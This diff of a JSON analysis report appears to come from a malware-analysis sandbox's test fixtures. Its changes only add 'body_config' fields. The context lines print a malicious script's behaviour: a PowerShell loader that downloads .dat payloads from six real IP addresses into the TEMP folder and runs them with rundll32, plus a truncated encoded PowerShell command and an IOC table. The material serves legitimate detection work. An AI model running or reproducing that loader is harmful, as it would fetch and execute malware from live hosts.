@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -17,6 +18,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: shell.application\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -39,6 +41,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs PowerShell via powershell.exe\n\t\tIOC: The script ran the command 'powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGU...\n\t\tShell.Application[12].shellexecute(\"powershell\", \"-encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAL...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -61,6 +64,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs code via shell application\n\t\tShell.Application[12].shellexecute(\"powershell\", \"-encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAL...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -83,6 +87,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -101,6 +106,7 @@
       {
         "auto_collapse": false,
         "body": "Start-Sleep -Seconds 4;$FractionallyTheopathy = (\"http://199.247.30.203/FfYIJfx.dat,http://94.131.117.111/EtXtKVmFMGNf.dat,http://85.239.41.205/B7hQgGuHC94A.dat,http://104.225.129.114/c4bOTpyL4I.dat,http://216.146.25.129/bvWVah0daMG.dat,http://141.94.86.90/1XAVN.dat\").split(\",\");foreach ($unwomanized in $FractionallyTheopathy) {try {wget $unwomanized -TimeoutSec 18 -O $env:TEMP\\chiseling.OutpeoplingHaunce;if ((Get-Item $env:TEMP\\chiseling.OutpeoplingHaunce).length -ge 100000) {start rundll32 $env:TEMP\\\\chiseling.OutpeoplingHaunce,X555;break;}}catch {Start-Sleep -Seconds 4;}}",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -120,6 +126,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"ip\", \"ioc\": \"104.225.129.114\"}, {\"ioc_type\": \"ip\", \"ioc\": \"141.94.86.90\"}, {\"ioc_type\": \"ip\", \"ioc\": \"199.247.30.203\"}, {\"ioc_type\": \"ip\", \"ioc\": \"216.146.25.129\"}, {\"ioc_type\": \"ip\", \"ioc\": \"85.239.41.205\"}, {\"ioc_type\": \"ip\", \"ioc\": \"94.131.117.111\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://104.225.129.114/c4botpyl4i.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/c4botpyl4i.dat\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://141.94.86.90/1xavn.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/1xavn.dat\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://199.247.30.203/ffyijfx.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ffyijfx.dat\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://216.146.25.129/bvwvah0damg.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/bvwvah0damg.dat\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://85.239.41.205/b7hqgguhc94a.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/b7hqgguhc94a.dat\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://94.131.117.111/etxtkvmfmgnf.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/etxtkvmfmgnf.dat\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 2,
@@ -167,6 +179,7 @@
       {
         "auto_collapse": false,
         "body": "View extracted file b31b98ed88d14365f43a9fad862c556b108df501b1fed8b4ca5d56b881fd963f.cleaned for details.",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
